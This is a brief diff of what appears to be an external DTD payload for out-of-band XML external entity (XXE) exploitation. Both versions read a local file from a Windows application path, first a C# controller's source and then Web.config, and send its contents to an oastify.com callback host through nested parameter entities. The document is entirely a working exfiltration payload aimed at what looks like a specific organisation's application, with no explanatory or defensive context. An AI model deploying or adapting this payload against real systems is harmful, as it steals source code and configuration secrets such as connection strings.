@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///D:/Desarrollo/WebPlanificacion/Agrosuper.Integracion.PlanificacionIndustrial.Web/Controllers/PedidosAdicionalesController.cs">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?controller=%file;'>">
+<!ENTITY % file SYSTEM "file:///D:/Desarrollo/WebPlanificacion/Web.config">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?webconfigroot=%file;'>">
 %eval;
 %exfil;
